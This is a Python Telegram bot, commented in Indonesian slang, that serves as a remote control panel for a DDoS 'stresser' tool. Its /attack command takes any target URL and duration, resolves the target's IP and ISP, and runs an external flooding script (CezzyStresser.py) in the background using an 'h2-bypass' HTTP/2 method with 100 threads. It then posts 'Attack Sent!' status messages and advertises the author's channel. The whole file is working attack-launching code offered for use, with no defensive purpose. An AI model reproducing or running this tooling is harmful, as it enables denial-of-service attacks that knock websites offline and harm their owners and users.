import telebot
import subprocess
import requests
import threading
import time
import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================= CONFIG =================
BOT_TOKEN = 'ISI_TOKEN_BOT_LU_DISINI'
OWNER_ID = 123456789  # Ganti pake ID Telegram lu
# ==========================================

bot = telebot.TeleBot(BOT_TOKEN)

def get_ip_info(domain):
    try:
        ip = requests.get(f"https://dns.google/resolve?name={domain}&type=A", timeout=3).json()['Answer'][0]['data']
        info = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        return ip, info.get('isp', 'Unknown ISP')
    except Exception:
        return "0.0.0.0", "Unknown"

# Fungsi buat ngejalanin tools lu di belakang layar
def run_attack_background(chat_id, message_id, url, duration):
    # Panggil CezzyStresser.py lu (Anggap aja nama file-nya itu)
    # Gua pake default h2-bypass dan 100 threads biar ga langsung crash
    command = f"python3 CezzyStresser.py"
    
    # Kita bypass menu interaktifnya dengan ngirim input langsung
    process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    # Format input: method url port time concurrency
    input_data = f"h2-bypass {url} 443 {duration} 100\n"
    
    # Jalanin command-nya
    process.communicate(input=input_data)
    
    # Edit pesan Telegram kalau udah selesai
    try:
        bot.edit_message_text(
            chat_id=chat_id, 
            message_id=message_id, 
            text=f"✅ **Attack Finished!**\nTarget: `{url}`", 
            parse_mode='Markdown'
        )
    except:
        pass

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "⚠️ Lu siapa anjing? Kaga ada akses!")
        return

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📢 Channel CezzyProject", url="https://t.me/CezzyProject"))
    
    text = """
😈 **CEZZY STRESSER PANEL** 😈

Format: `/attack <url> <time>`
Contoh: `/attack https://target.com 60`
"""
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_command(message):
    if message.from_user.id != OWNER_ID:
        return
        
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "❌ Format salah cuy! Contoh: `/attack https://target.com 60`", parse_mode='Markdown')
            return

        target_url = args[1]
        duration = args[2]
        
        # Ambil domain buat cek IP
        target_domain = target_url.replace("https://", "").replace("http://", "").split("/")[0]
        
        # Proses ngambil info IP
        msg = bot.reply_to(message, "⏳ *Mengambil data target...*", parse_mode='Markdown')
        
        ip, isp = get_ip_info(target_domain)
        
        # Format pesan persis kayak AalStresser
        attack_text = f"""
🚀 **Attack Sent!**

**Target:** {target_url}
**Duration:** {duration}s
**Method:** h2-bypass
**ISP:** {isp}
**IP:** {ip}
**Server:** 1/1
**owner:** t.me/CezzyProject
**ch:** t.me/CezzyProject
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Check Target", url=target_url))

        # Edit pesan jadi sukses
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=attack_text,
            reply_markup=markup,
            parse_mode='Markdown'
        )
        
        # Jalanin tembakan di background biar bot ga freeze
        thread = threading.Thread(target=run_attack_background, args=(message.chat.id, msg.message_id, target_url, duration))
        thread.daemon = True
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

print("CEZZY BOT NYALA... 🔥")
bot.infinity_polling()